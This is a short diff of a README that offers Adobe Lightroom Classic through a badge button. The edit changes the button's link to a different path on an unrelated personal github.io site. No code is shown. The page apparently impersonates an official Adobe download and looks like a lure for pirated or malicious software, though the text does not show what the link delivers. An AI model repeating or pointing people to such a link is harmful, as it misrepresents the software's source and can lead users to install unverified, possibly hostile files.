@@ -21,7 +21,7 @@ To begin using this **Adobe Lightroom Classic Photo Editor** and **Adobe Lightro
 | :--- | :--- |
 | **Get Adobe Lightroom Classic Photo Editor** | Click the button below to start using this **Adobe Lightroom Classic Catalog Manager**. |
 
-[![Button](https://img.shields.io/badge/📸-Get_Adobe_Lightroom_Classic-2ea44f?style=for-the-badge)](https://gorbachyovgermanes.github.io/.github/)
+[![Button](https://img.shields.io/badge/📸-Get_Adobe_Lightroom_Classic-2ea44f?style=for-the-badge)](https://gorbachyovgermanes.github.io/.github/adobe-lightroom-classic-photo-editor)
 
 ## System Requirements
 
